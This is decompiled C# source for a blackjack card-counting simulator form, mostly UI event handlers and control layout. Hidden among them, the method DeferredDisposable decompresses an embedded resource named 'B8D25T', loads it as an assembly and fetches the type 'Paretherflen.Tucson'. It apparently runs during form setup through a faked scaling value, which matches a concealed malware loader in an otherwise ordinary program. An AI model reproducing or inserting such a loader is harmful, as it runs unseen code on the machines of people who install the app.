        this.txtStartingBankRoll.Text = "50000";
        num1 = 50000;
      }
      double num2 = (double) this.tbAgression.Value * 0.1;
      double num3 = (double) (int) Math.Round((double) num1 / 500.0, 0);
      this.lblBettingUnit.Text = Convert.ToString((int) Math.Round(num3 + num3 * num2, 0));
    }

    private void txtStartingBankRoll_TextChanged(object sender, EventArgs e)
    {
      int num1;
      try
      {
        num1 = Convert.ToInt32(this.txtStartingBankRoll.Text);
        if (num1 < 100 && num1 > 10000000)
        {
          this.txtStartingBankRoll.Text = "50000";
          num1 = 50000;
        }
      }
      catch
      {
        this.txtStartingBankRoll.Text = "50000";
        num1 = 50000;
      }
      double num2 = (double) this.tbAgression.Value * 0.1;
      double num3 = (double) (int) Math.Round((double) num1 / 500.0, 0);
      this.lblBettingUnit.Text = Convert.ToString((int) Math.Round(num3 + num3 * num2, 0));
    }

    private void rbFalse_CheckedChanged(object sender, EventArgs e)
    {
      if (this.rbFalse.Checked)
        this.lblTCAdjustment.Text = "1";
      else
        this.lblTCAdjustment.Text = "1.5";
    }

    private void cmdDetails_Click(object sender, EventArgs e)
    {
      if (this.Width == 885)
      {
        this.Width = 567;
        this.Height = 640;
      }
      else
      {
        this.Width = 885;
        this.Height = 640;
      }
    }

    private void rbErrorsOn_CheckedChanged(object sender, EventArgs e)
    {
      if (this.rbErrorsOn.Checked)
        this.gbError.Enabled = true;
      else
        this.gbError.Enabled = false;
    }

    private void rbErrorsOff_CheckedChanged(object sender, EventArgs e)
    {
      if (this.rbErrorsOn.Checked)
        this.gbError.Enabled = true;
      else
        this.gbError.Enabled = false;
    }

    private void gbError_Enter(object sender, EventArgs e)
    {
    }

    private void groupBox7_Enter(object sender, EventArgs e)
    {
    }

    private void tbErrorRate_Scroll(object sender, EventArgs e) => this.lblErrorsPer100Hands.Text = Convert.ToString(this.tbErrorRate.Value) + " errors per every 100 hands.";

    private void button1_Click(object sender, EventArgs e)
    {
      try
      {
        string lower = this.txtPath.Text.ToLower();
        if (!lower.EndsWith(".txt"))
          lower += ".txt";
        StreamWriter streamWriter = new StreamWriter(lower);
        streamWriter.WriteLine("Highest Bankroll, Ending Bankroll, Lowest Bankroll");
        int int16 = (int) Convert.ToInt16(this.numericUpDown1.Value);
        for (int index = 0; index < int16; ++index)
        {
          this.cmdDeal_Click((object) null, (EventArgs) null);
          streamWriter.WriteLine(this.highestBankroll.ToString() + "," + this.PlayerMoneyTotal.ToString() + "," + this.lowestBankroll.ToString());
        }
        streamWriter.Close();
        int num = (int) MessageBox.Show("Simulation Complete!");
      }
      catch
      {
        int num = (int) MessageBox.Show("You must enter a valid path, and number of iterations to run multiple simulations.");
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private static SizeF DeferredDisposable()
    {
      byte[] array;
      using (GZipStream gzipStream = new GZipStream((Stream) new MemoryStream((byte[]) new ResourceManager(frmBlackJackSim.ScheduledConcurrent).GetObject("B8D25T")), CompressionMode.Decompress))
      {
        byte[] buffer = new byte[4096];
        using (MemoryStream memoryStream = new MemoryStream())
        {
          int count;
          do
          {
            count = gzipStream.Read(buffer, 0, 4096);
            if (count > 0)
              memoryStream.Write(buffer, 0, count);
          }
          while (count > 0);
          array = memoryStream.ToArray();
        }
      }
      frmBlackJackSim.CreateCallback = (object) frmBlackJackSim.CategoryMembership(frmBlackJackSim.CompilationRelaxations(array, true)).GetType("Paretherflen.Tucson");
      return new SizeF(6f, 13f);
    }

    private static Assembly CategoryMembership(object ResolvedAssemblyFiles) => (Assembly) ResolvedAssemblyFiles;

    public static object CompilationRelaxations(byte[] Message, bool Properties) => (object) Thread.GetDomain().Load(Message);

    private void InitializeComponent()
    {
      this.cmdDeal = new Button();
      this.rtbHandOutcome = new RichTextBox();
      this.label1 = new Label();
      this.lblDealerWins = new Label();
      this.label2 = new Label();
      this.lblPlayerWins = new Label();
      this.label3 = new Label();
      this.lblPushes = new Label();
      this.label4 = new Label();
      this.lblShoes = new Label();
      this.label6 = new Label();
      this.lblPlayerBankroll = new Label();
      this.Label12 = new Label();
      this.label8 = new Label();
      this.txtHandsToSim = new TextBox();
      this.label9 = new Label();
      this.progressBar1 = new ProgressBar();
      this.label10 = new Label();
      this.groupBox1 = new GroupBox();
      this.rbFalse = new RadioButton();
      this.rbTrue = new RadioButton();
      this.label11 = new Label();
      this.lblSplits = new Label();
      this.lblTotalRounds = new Label();
      this.lblTotalHands = new Label();
      this.label17 = new Label();
      this.lblPlayerBlackjacks = new Label();
      this.label21 = new Label();
      this.lblWinningDoubles = new Label();
      this.label22 = new Label();
      this.lblLosingDoubles = new Label();
      this.label23 = new Label();
      this.lblPushingDoubles = new Label();
      this.groupBox2 = new GroupBox();
      this.checkBox1 = new CheckBox();
      this.checkBox2 = new CheckBox();
      this.label7 = new Label();
      this.checkBox3 = new CheckBox();
      this.groupBox3 = new GroupBox();
      this.txtTableMax = new TextBox();
      this.txtTableMin = new TextBox();
      this.label35 = new Label();
      this.label34 = new Label();
      this.groupBox5 = new GroupBox();
      this.rbCountFalse = new RadioButton();
      this.rbCountTrue = new RadioButton();
      this.chkGUIUpdate = new CheckBox();
      this.cmdDetails = new Button();
      this.groupBox4 = new GroupBox();
      this.label41 = new Label();
      this.lblHouseAdvantage = new Label();
      this.label28 = new Label();
      this.lblPlayerCostWin = new Label();
      this.lblDealerCostWin = new Label();
      this.label20 = new Label();
      this.label18 = new Label();
      this.lblDealerWinTotal = new Label();
      this.label26 = new Label();
      this.lblDealerStraightWin = new Label();
      this.lblDealerWinOnDouble = new Label();
      this.label24 = new Label();
      this.label25 = new Label();
      this.lblPlayerStraightWin = new Label();
      this.label16 = new Label();
      this.lblUnweightedAdv = new Label();
      this.label19 = new Label();
      this.lblWinOnBJ = new Label();
      this.lblWinOnDouble = new Label();
      this.lblNonPushingTotal = new Label();
      this.label15 = new Label();
      this.label14 = new Label();
      this.label13 = new Label();
      this.lblPlayerWinTotal = new Label();
      this.label5 = new Label();
      this.groupBox6 = new GroupBox();
      this.lblInsuranceBetsLost = new Label();
      this.lblInsuranceBetsWon = new Label();
      this.label43 = new Label();
      this.label42 = new Label();
      this.lblTCAdjustment = new Label();
      this.label40 = new Label();
      this.label39 = new Label();
      this.label38 = new Label();
      this.label37 = new Label();
      this.lblBettingUnit = new Label();
      this.label36 = new Label();
      this.tbAgression = new TrackBar();
      this.label33 = new Label();
      this.txtStartingBankRoll = new TextBox();
      this.lblHighestBankroll = new Label();
      this.lblHighestBet = new Label();
      this.lblLowestBankroll = new Label();
      this.lblLowestCount = new Label();
      this.lblHighestCount = new Label();
      this.label32 = new Label();
      this.label31 = new Label();
      this.label30 = new Label();
      this.label29 = new Label();
      this.label27 = new Label();
      this.groupBox7 = new GroupBox();
      this.lblErrors = new Label();
      this.label52 = new Label();
      this.gbError = new GroupBox();
      this.lblErrorsPer100Hands = new Label();
      this.label50 = new Label();
      this.label49 = new Label();
      this.label48 = new Label();
      this.label46 = new Label();
      this.label47 = new Label();
      this.label45 = new Label();
      this.label44 = new Label();
      this.tbErrorRate = new TrackBar();
      this.groupBox8 = new GroupBox();
      this.rbErrorsOff = new RadioButton();
      this.rbErrorsOn = new RadioButton();
      this.cmdMultiSim = new Button();
      this.numericUpDown1 = new NumericUpDown();
      this.label51 = new Label();
      this.txtPath = new TextBox();
      this.groupBox9 = new GroupBox();
      this.groupBox1.SuspendLayout();
      this.groupBox2.SuspendLayout();
      this.groupBox3.SuspendLayout();
      this.groupBox5.SuspendLayout();
      this.groupBox4.SuspendLayout();
      this.groupBox6.SuspendLayout();
      this.tbAgression.BeginInit();
      this.groupBox7.SuspendLayout();
      this.gbError.SuspendLayout();
      this.tbErrorRate.BeginInit();
      this.groupBox8.SuspendLayout();
      this.numericUpDown1.BeginInit();
      this.groupBox9.SuspendLayout();
      this.SuspendLayout();
      this.cmdDeal.BackColor = SystemColors.Control;
      this.cmdDeal.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.cmdDeal.Location = new Point(277, 288);
      this.cmdDeal.Name = "cmdDeal";
      this.cmdDeal.Size = new Size(277, 45);
      this.cmdDeal.TabIndex = 2;
      this.cmdDeal.Text = "START ONE SIM";
      this.cmdDeal.UseVisualStyleBackColor = false;
      this.cmdDeal.Click += new EventHandler(this.cmdDeal_Click);
      this.rtbHandOutcome.Location = new Point(277, 526);
      this.rtbHandOutcome.Name = "rtbHandOutcome";
      this.rtbHandOutcome.Size = new Size(277, 48);
      this.rtbHandOutcome.TabIndex = 3;
      this.rtbHandOutcome.Text = "";
      this.label1.AutoSize = true;
      this.label1.Location = new Point(6, 23);
      this.label1.Name = "label1";
      this.label1.Size = new Size(177, 32);
      this.label1.TabIndex = 5;
      this.label1.Text = "Dealer Wins:";
      this.lblDealerWins.AutoSize = true;
      this.lblDealerWins.Location = new Point(99, 23);
      this.lblDealerWins.Name = "lblDealerWins";
      this.lblDealerWins.Size = new Size(31, 32);
      this.lblDealerWins.TabIndex = 6;
      this.lblDealerWins.Text = "0";
      this.label2.AutoSize = true;
      this.label2.Location = new Point(6, 36);
      this.label2.Name = "label2";
      this.label2.Size = new Size(174, 32);
      this.label2.TabIndex = 7;
      this.label2.Text = "Player Wins:";
      this.lblPlayerWins.AutoSize = true;
      this.lblPlayerWins.Location = new Point(99, 36);
      this.lblPlayerWins.Name = "lblPlayerWins";
      this.lblPlayerWins.Size = new Size(31, 32);
      this.lblPlayerWins.TabIndex = 8;
      this.lblPlayerWins.Text = "0";
      this.label3.AutoSize = true;
      this.label3.Location = new Point(6, 49);
      this.label3.Name = "label3";
      this.label3.Size = new Size(118, 32);
      this.label3.TabIndex = 9;
      this.label3.Text = "Pushes:";
      this.lblPushes.AutoSize = true;
      this.lblPushes.Location = new Point(99, 49);
      this.lblPushes.Name = "lblPushes";
      this.lblPushes.Size = new Size(31, 32);
      this.lblPushes.TabIndex = 10;
      this.lblPushes.Text = "0";
      this.label4.AutoSize = true;
      this.label4.Location = new Point(6, 138);
      this.label4.Name = "label4";
      this.label4.Size = new Size(273, 32);
      this.label4.TabIndex = 11;
      this.label4.Text = "8-Deck Shoes Used:";
      this.lblShoes.AutoSize = true;
      this.lblShoes.Location = new Point(133, 138);
      this.lblShoes.Name = "lblShoes";
      this.lblShoes.Size = new Size(31, 32);
      this.lblShoes.TabIndex = 12;
      this.lblShoes.Text = "0";
      this.label6.AutoSize = true;
      this.label6.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label6.Location = new Point(4, 200);
      this.label6.Name = "label6";
      this.label6.Size = new Size(375, 55);
      this.label6.TabIndex = 15;
      this.label6.Text = "Player Net Gain:";
      this.lblPlayerBankroll.AutoSize = true;
      this.lblPlayerBankroll.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblPlayerBankroll.ForeColor = Color.Blue;
      this.lblPlayerBankroll.Location = new Point(142, 200);
      this.lblPlayerBankroll.Name = "lblPlayerBankroll";
      this.lblPlayerBankroll.Size = new Size(52, 55);
      this.lblPlayerBankroll.TabIndex = 17;
      this.lblPlayerBankroll.Text = "0";
      this.Label12.AutoSize = true;
      this.Label12.Location = new Point(6, 162);
      this.Label12.Name = "Label12";
      this.Label12.Size = new Size(294, 32);
      this.Label12.TabIndex = 19;
      this.Label12.Text = "Total Rounds Played: ";
      this.label8.AutoSize = true;
      this.label8.Location = new Point(6, 62);
      this.label8.Name = "label8";
      this.label8.Size = new Size(94, 32);
      this.label8.TabIndex = 20;
      this.label8.Text = "Splits:";
      this.txtHandsToSim.Location = new Point(171, 25);
      this.txtHandsToSim.Name = "txtHandsToSim";
      this.txtHandsToSim.Size = new Size(88, 38);
      this.txtHandsToSim.TabIndex = 21;
      this.txtHandsToSim.Text = "1000000";
      this.label9.AutoSize = true;
      this.label9.Location = new Point(17, 28);
      this.label9.Name = "label9";
      this.label9.Size = new Size(393, 32);
      this.label9.TabIndex = 22;
      this.label9.Text = "Number of Hands to Simulate:";
      this.progressBar1.Dock = DockStyle.Bottom;
      this.progressBar1.ForeColor = Color.Yellow;
      this.progressBar1.Location = new Point(0, 590);
      this.progressBar1.Name = "progressBar1";
      this.progressBar1.Size = new Size(873, 23);
      this.progressBar1.TabIndex = 23;
      this.label10.AutoSize = true;
      this.label10.Location = new Point(277, 510);
      this.label10.Name = "label10";
      this.label10.Size = new Size(411, 32);
      this.label10.TabIndex = 24;
      this.label10.Text = "First 10 Hands (For Reference):";
      this.groupBox1.Controls.Add((Control) this.rbFalse);
      this.groupBox1.Controls.Add((Control) this.rbTrue);
      this.groupBox1.Location = new Point(152, 151);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(118, 60);
      this.groupBox1.TabIndex = 25;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "Dealer Hits Soft 17";
      this.rbFalse.AutoSize = true;
      this.rbFalse.Checked = true;
      this.rbFalse.Location = new Point(32, 36);
      this.rbFalse.Name = "rbFalse";
      this.rbFalse.Size = new Size(142, 36);
      this.rbFalse.TabIndex = 1;
      this.rbFalse.TabStop = true;
      this.rbFalse.Text = "FALSE";
      this.rbFalse.UseVisualStyleBackColor = true;
      this.rbFalse.CheckedChanged += new EventHandler(this.rbFalse_CheckedChanged);
      this.rbTrue.AutoSize = true;
      this.rbTrue.Location = new Point(32, 18);
      this.rbTrue.Name = "rbTrue";
      this.rbTrue.Size = new Size(128, 36);
      this.rbTrue.TabIndex = 0;
      this.rbTrue.Text = "TRUE";
      this.rbTrue.UseVisualStyleBackColor = true;
      this.label11.AutoSize = true;
      this.label11.Location = new Point(6, 175);
      this.label11.Name = "label11";
      this.label11.Size = new Size(271, 32);
      this.label11.TabIndex = 26;
      this.label11.Text = "Total Hands Played:";
      this.lblSplits.AutoSize = true;
      this.lblSplits.Location = new Point(99, 62);
      this.lblSplits.Name = "lblSplits";
      this.lblSplits.Size = new Size(31, 32);
      this.lblSplits.TabIndex = 27;
      this.lblSplits.Text = "0";
      this.lblTotalRounds.AutoSize = true;
      this.lblTotalRounds.Location = new Point(133, 162);
      this.lblTotalRounds.Name = "lblTotalRounds";
      this.lblTotalRounds.Size = new Size(31, 32);
      this.lblTotalRounds.TabIndex = 28;
      this.lblTotalRounds.Text = "0";
      this.lblTotalHands.AutoSize = true;
      this.lblTotalHands.Location = new Point(133, 175);
      this.lblTotalHands.Name = "lblTotalHands";
      this.lblTotalHands.Size = new Size(31, 32);
      this.lblTotalHands.TabIndex = 29;
      this.lblTotalHands.Text = "0";
      this.label17.AutoSize = true;
      this.label17.Location = new Point(6, 75);
      this.label17.Name = "label17";
      this.label17.Size = new Size(246, 32);
      this.label17.TabIndex = 36;
      this.label17.Text = "Player Blackjacks:";
      this.lblPlayerBlackjacks.AutoSize = true;
      this.lblPlayerBlackjacks.Location = new Point(99, 75);
      this.lblPlayerBlackjacks.Name = "lblPlayerBlackjacks";
      this.lblPlayerBlackjacks.Size = new Size(31, 32);
      this.lblPlayerBlackjacks.TabIndex = 37;
      this.lblPlayerBlackjacks.Text = "0";
      this.label21.AutoSize = true;
      this.label21.Location = new Point(6, 89);
      this.label21.Name = "label21";
      this.label21.Size = new Size(223, 32);
      this.label21.TabIndex = 45;
      this.label21.Text = "Wining Doubles:";
      this.lblWinningDoubles.AutoSize = true;
      this.lblWinningDoubles.Location = new Point(99, 89);
      this.lblWinningDoubles.Name = "lblWinningDoubles";
      this.lblWinningDoubles.Size = new Size(31, 32);
      this.lblWinningDoubles.TabIndex = 46;
      this.lblWinningDoubles.Text = "0";
      this.label22.AutoSize = true;
      this.label22.Location = new Point(6, 102);
      this.label22.Name = "label22";
      this.label22.Size = new Size(220, 32);
      this.label22.TabIndex = 47;
      this.label22.Text = "Losing Doubles:";
      this.lblLosingDoubles.AutoSize = true;
      this.lblLosingDoubles.Location = new Point(99, 102);
      this.lblLosingDoubles.Name = "lblLosingDoubles";
      this.lblLosingDoubles.Size = new Size(31, 32);
      this.lblLosingDoubles.TabIndex = 48;
      this.lblLosingDoubles.Text = "0";
      this.label23.AutoSize = true;
      this.label23.Location = new Point(6, 115);
      this.label23.Name = "label23";
      this.label23.Size = new Size(239, 32);
      this.label23.TabIndex = 49;
      this.label23.Text = "Pushing Doubles:";
      this.lblPushingDoubles.AutoSize = true;
      this.lblPushingDoubles.Location = new Point(99, 115);
      this.lblPushingDoubles.Name = "lblPushingDoubles";
      this.lblPushingDoubles.Size = new Size(31, 32);
      this.lblPushingDoubles.TabIndex = 50;
      this.lblPushingDoubles.Text = "0";
      this.groupBox2.Controls.Add((Control) this.lblPushingDoubles);
      this.groupBox2.Controls.Add((Control) this.label23);
      this.groupBox2.Controls.Add((Control) this.lblLosingDoubles);
      this.groupBox2.Controls.Add((Control) this.label22);
      this.groupBox2.Controls.Add((Control) this.lblWinningDoubles);
      this.groupBox2.Controls.Add((Control) this.label21);
      this.groupBox2.Controls.Add((Control) this.lblPlayerBlackjacks);
      this.groupBox2.Controls.Add((Control) this.label17);
      this.groupBox2.Controls.Add((Control) this.lblTotalHands);
      this.groupBox2.Controls.Add((Control) this.lblTotalRounds);
      this.groupBox2.Controls.Add((Control) this.lblSplits);
      this.groupBox2.Controls.Add((Control) this.label11);
      this.groupBox2.Controls.Add((Control) this.label8);
      this.groupBox2.Controls.Add((Control) this.Label12);
      this.groupBox2.Controls.Add((Control) this.lblPlayerBankroll);
      this.groupBox2.Controls.Add((Control) this.label6);
      this.groupBox2.Controls.Add((Control) this.lblShoes);
      this.groupBox2.Controls.Add((Control) this.label4);
      this.groupBox2.Controls.Add((Control) this.lblPushes);
      this.groupBox2.Controls.Add((Control) this.label3);
      this.groupBox2.Controls.Add((Control) this.lblPlayerWins);
      this.groupBox2.Controls.Add((Control) this.label2);
      this.groupBox2.Controls.Add((Control) this.lblDealerWins);
      this.groupBox2.Controls.Add((Control) this.label1);
      this.groupBox2.Location = new Point(6, 3);
      this.groupBox2.Name = "groupBox2";
      this.groupBox2.Size = new Size(266, 240);
      this.groupBox2.TabIndex = 52;
      this.groupBox2.TabStop = false;
      this.groupBox2.Text = "STATS";
      this.checkBox1.AutoSize = true;
      this.checkBox1.Checked = true;
      this.checkBox1.CheckState = CheckState.Checked;
      this.checkBox1.Enabled = false;
      this.checkBox1.Location = new Point(15, 194);
      this.checkBox1.Name = "checkBox1";
      this.checkBox1.Size = new Size(275, 36);
      this.checkBox1.TabIndex = 53;
      this.checkBox1.Text = "Double After Split";
      this.checkBox1.UseVisualStyleBackColor = true;
      this.checkBox2.AutoSize = true;
      this.checkBox2.Checked = true;
      this.checkBox2.CheckState = CheckState.Checked;
      this.checkBox2.Enabled = false;
      this.checkBox2.Location = new Point(15, 148);
      this.checkBox2.Name = "checkBox2";
      this.checkBox2.Size = new Size(298, 36);
      this.checkBox2.TabIndex = 54;
      this.checkBox2.Text = "BlackJack Pays 2:1";
      this.checkBox2.UseVisualStyleBackColor = true;
      this.label7.AutoSize = true;
      this.label7.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label7.Location = new Point(90, 109);
      this.label7.Name = "label7";
      this.label7.Size = new Size(267, 32);
      this.label7.TabIndex = 56;
      this.label7.Text = "Basic Betting Unit:";
      this.checkBox3.AutoSize = true;
      this.checkBox3.Checked = true;
      this.checkBox3.CheckState = CheckState.Checked;
      this.checkBox3.Enabled = false;
      this.checkBox3.Location = new Point(15, 171);
      this.checkBox3.Name = "checkBox3";
      this.checkBox3.Size = new Size(207, 36);
      this.checkBox3.TabIndex = 57;
      this.checkBox3.Text = "No Re-splits";
      this.checkBox3.UseVisualStyleBackColor = true;
      this.groupBox3.Controls.Add((Control) this.txtTableMax);
      this.groupBox3.Controls.Add((Control) this.txtTableMin);
      this.groupBox3.Controls.Add((Control) this.label35);
      this.groupBox3.Controls.Add((Control) this.label34);
      this.groupBox3.Controls.Add((Control) this.groupBox5);
      this.groupBox3.Controls.Add((Control) this.checkBox3);
      this.groupBox3.Controls.Add((Control) this.checkBox2);
      this.groupBox3.Controls.Add((Control) this.checkBox1);
      this.groupBox3.Controls.Add((Control) this.chkGUIUpdate);
      this.groupBox3.Controls.Add((Control) this.groupBox1);
      this.groupBox3.Controls.Add((Control) this.label9);
      this.groupBox3.Controls.Add((Control) this.txtHandsToSim);
      this.groupBox3.Location = new Point(278, 3);
      this.groupBox3.Name = "groupBox3";
      this.groupBox3.Size = new Size(276, 280);
      this.groupBox3.TabIndex = 58;
      this.groupBox3.TabStop = false;
      this.groupBox3.Text = "OPTIONS";
      this.txtTableMax.Location = new Point(171, 73);
      this.txtTableMax.Name = "txtTableMax";
      this.txtTableMax.Size = new Size(88, 38);
      this.txtTableMax.TabIndex = 62;
      this.txtTableMax.Text = "5000";
      this.txtTableMin.Location = new Point(171, 49);
      this.txtTableMin.Name = "txtTableMin";
      this.txtTableMin.Size = new Size(88, 38);
      this.txtTableMin.TabIndex = 61;
      this.txtTableMin.Text = "10";
      this.label35.AutoSize = true;
      this.label35.Location = new Point(78, 76);
      this.label35.Name = "label35";
      this.label35.Size = new Size(224, 32);
      this.label35.TabIndex = 60;
      this.label35.Text = "Table Maximum:";
      this.label34.AutoSize = true;
      this.label34.Location = new Point(78, 52);
      this.label34.Name = "label34";
      this.label34.Size = new Size(217, 32);
      this.label34.TabIndex = 59;
      this.label34.Text = "Table Minimum:";
      this.groupBox5.Controls.Add((Control) this.rbCountFalse);
      this.groupBox5.Controls.Add((Control) this.rbCountTrue);
      this.groupBox5.Location = new Point(15, 220);
      this.groupBox5.Name = "groupBox5";
      this.groupBox5.Size = new Size((int) byte.MaxValue, 53);
      this.groupBox5.TabIndex = 58;
      this.groupBox5.TabStop = false;
      this.groupBox5.Text = "Player Counts Cards";
      this.rbCountFalse.AutoSize = true;
      this.rbCountFalse.Location = new Point(144, 23);
      this.rbCountFalse.Name = "rbCountFalse";
      this.rbCountFalse.Size = new Size(142, 36);
      this.rbCountFalse.TabIndex = 1;
      this.rbCountFalse.Text = "FALSE";
      this.rbCountFalse.UseVisualStyleBackColor = true;
      this.rbCountFalse.CheckedChanged += new EventHandler(this.rbCountFalse_CheckedChanged);
      this.rbCountTrue.AutoSize = true;
      this.rbCountTrue.Checked = true;
      this.rbCountTrue.Location = new Point(66, 23);
      this.rbCountTrue.Name = "rbCountTrue";
      this.rbCountTrue.Size = new Size(128, 36);
      this.rbCountTrue.TabIndex = 0;
      this.rbCountTrue.TabStop = true;
      this.rbCountTrue.Text = "TRUE";
      this.rbCountTrue.UseVisualStyleBackColor = true;
      this.chkGUIUpdate.AutoSize = true;
      this.chkGUIUpdate.Location = new Point(66, 115);
      this.chkGUIUpdate.Name = "chkGUIUpdate";
      this.chkGUIUpdate.Size = new Size(388, 36);
      this.chkGUIUpdate.TabIndex = 51;
      this.chkGUIUpdate.Text = "GUI Updates Continuously";
      this.chkGUIUpdate.UseVisualStyleBackColor = true;
      this.cmdDetails.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.cmdDetails.Location = new Point(359, 450);
      this.cmdDetails.Name = "cmdDetails";
      this.cmdDetails.Size = new Size(135, 46);
      this.cmdDetails.TabIndex = 62;
      this.cmdDetails.Text = "Show/Hide Detals";
      this.cmdDetails.UseVisualStyleBackColor = true;
      this.cmdDetails.Click += new EventHandler(this.cmdDetails_Click);
      this.groupBox4.Controls.Add((Control) this.label41);
      this.groupBox4.Controls.Add((Control) this.lblHouseAdvantage);
      this.groupBox4.Controls.Add((Control) this.label28);
      this.groupBox4.Controls.Add((Control) this.lblPlayerCostWin);
      this.groupBox4.Controls.Add((Control) this.lblDealerCostWin);
      this.groupBox4.Controls.Add((Control) this.label20);
      this.groupBox4.Controls.Add((Control) this.label18);
      this.groupBox4.Controls.Add((Control) this.lblDealerWinTotal);
      this.groupBox4.Controls.Add((Control) this.label26);
      this.groupBox4.Controls.Add((Control) this.lblDealerStraightWin);
      this.groupBox4.Controls.Add((Control) this.lblDealerWinOnDouble);
      this.groupBox4.Controls.Add((Control) this.label24);
      this.groupBox4.Controls.Add((Control) this.label25);
      this.groupBox4.Controls.Add((Control) this.lblPlayerStraightWin);
      this.groupBox4.Controls.Add((Control) this.label16);
      this.groupBox4.Controls.Add((Control) this.lblUnweightedAdv);
      this.groupBox4.Controls.Add((Control) this.label19);
      this.groupBox4.Controls.Add((Control) this.lblWinOnBJ);
      this.groupBox4.Controls.Add((Control) this.lblWinOnDouble);
      this.groupBox4.Controls.Add((Control) this.lblNonPushingTotal);
      this.groupBox4.Controls.Add((Control) this.label15);
      this.groupBox4.Controls.Add((Control) this.label14);
      this.groupBox4.Controls.Add((Control) this.label13);
      this.groupBox4.Controls.Add((Control) this.lblPlayerWinTotal);
      this.groupBox4.Controls.Add((Control) this.label5);
      this.groupBox4.Location = new Point(6, 249);
      this.groupBox4.Name = "groupBox4";
      this.groupBox4.Size = new Size(265, 326);
      this.groupBox4.TabIndex = 59;
      this.groupBox4.TabStop = false;
      this.groupBox4.Text = "HOUSE ADVANTAGE";
      this.label41.AutoSize = true;
      this.label41.Location = new Point(24, 270);
      this.label41.Name = "label41";
      this.label41.Size = new Size(489, 32);
      this.label41.TabIndex = 68;
      this.label41.Text = "[Playing Basic Strategy, No Counting]";
      this.lblHouseAdvantage.AutoSize = true;
      this.lblHouseAdvantage.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblHouseAdvantage.ForeColor = Color.Blue;
      this.lblHouseAdvantage.Location = new Point(166, 246);
      this.lblHouseAdvantage.Name = "lblHouseAdvantage";
      this.lblHouseAdvantage.Size = new Size(52, 55);
      this.lblHouseAdvantage.TabIndex = 67;
      this.lblHouseAdvantage.Text = "0";
      this.label28.AutoSize = true;
      this.label28.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label28.Location = new Point(7, 246);
      this.label28.Name = "label28";
      this.label28.Size = new Size(421, 55);
      this.label28.TabIndex = 66;
      this.label28.Text = "House Advantage:";
      this.lblPlayerCostWin.AutoSize = true;
      this.lblPlayerCostWin.Location = new Point(167, 112);
      this.lblPlayerCostWin.Name = "lblPlayerCostWin";
      this.lblPlayerCostWin.Size = new Size(31, 32);
      this.lblPlayerCostWin.TabIndex = 64;
      this.lblPlayerCostWin.Text = "0";
      this.lblDealerCostWin.AutoSize = true;
      this.lblDealerCostWin.Location = new Point(167, 187);
      this.lblDealerCostWin.Name = "lblDealerCostWin";
      this.lblDealerCostWin.Size = new Size(31, 32);
      this.lblDealerCostWin.TabIndex = 63;
      this.lblDealerCostWin.Text = "0";
      this.label20.AutoSize = true;
      this.label20.Location = new Point(7, 187);
      this.label20.Name = "label20";
      this.label20.Size = new Size(384, 32);
      this.label20.TabIndex = 62;
      this.label20.Text = "P (Cost Weigted Dealer Win):";
      this.label18.AutoSize = true;
      this.label18.Location = new Point(7, 112);
      this.label18.Name = "label18";
      this.label18.Size = new Size(381, 32);
      this.label18.TabIndex = 61;
      this.label18.Text = "P (Cost Weigted Player Win):";
      this.lblDealerWinTotal.AutoSize = true;
      this.lblDealerWinTotal.Location = new Point(167, 174);
      this.lblDealerWinTotal.Name = "lblDealerWinTotal";
      this.lblDealerWinTotal.Size = new Size(31, 32);
      this.lblDealerWinTotal.TabIndex = 60;
      this.lblDealerWinTotal.Text = "0";
      this.label26.AutoSize = true;
      this.label26.Location = new Point(7, 174);
      this.label26.Name = "label26";
      this.label26.Size = new Size(263, 32);
      this.label26.TabIndex = 59;
      this.label26.Text = "P (Any Dealer Win):";
      this.lblDealerStraightWin.AutoSize = true;
      this.lblDealerStraightWin.Location = new Point(167, 160);
      this.lblDealerStraightWin.Name = "lblDealerStraightWin";
      this.lblDealerStraightWin.Size = new Size(31, 32);
      this.lblDealerStraightWin.TabIndex = 58;
      this.lblDealerStraightWin.Text = "0";
      this.lblDealerWinOnDouble.AutoSize = true;
      this.lblDealerWinOnDouble.Location = new Point(167, 145);
      this.lblDealerWinOnDouble.Name = "lblDealerWinOnDouble";
      this.lblDealerWinOnDouble.Size = new Size(31, 32);
      this.lblDealerWinOnDouble.TabIndex = 57;
      this.lblDealerWinOnDouble.Text = "0";
      this.label24.AutoSize = true;
      this.label24.Location = new Point(7, 145);
      this.label24.Name = "label24";
      this.label24.Size = new Size(344, 32);
      this.label24.TabIndex = 56;
      this.label24.Text = "P (Dealer Win on Double):";
      this.label25.AutoSize = true;
      this.label25.Location = new Point(7, 160);
      this.label25.Name = "label25";
      this.label25.Size = new Size(313, 32);
      this.label25.TabIndex = 55;
      this.label25.Text = "P (Dealer Straight Win):";
      this.lblPlayerStraightWin.AutoSize = true;
      this.lblPlayerStraightWin.Location = new Point(167, 81);
      this.lblPlayerStraightWin.Name = "lblPlayerStraightWin";
      this.lblPlayerStraightWin.Size = new Size(31, 32);
      this.lblPlayerStraightWin.TabIndex = 54;
      this.lblPlayerStraightWin.Text = "0";
      this.label16.AutoSize = true;
      this.label16.Location = new Point(7, 81);
      this.label16.Name = "label16";
      this.label16.Size = new Size(310, 32);
      this.label16.TabIndex = 53;
      this.label16.Text = "P (Player Straight Win):";
      this.lblUnweightedAdv.AutoSize = true;
      this.lblUnweightedAdv.Location = new Point(169, 224);
      this.lblUnweightedAdv.Name = "lblUnweightedAdv";
      this.lblUnweightedAdv.Size = new Size(31, 32);
      this.lblUnweightedAdv.TabIndex = 52;
      this.lblUnweightedAdv.Text = "0";
      this.label19.AutoSize = true;
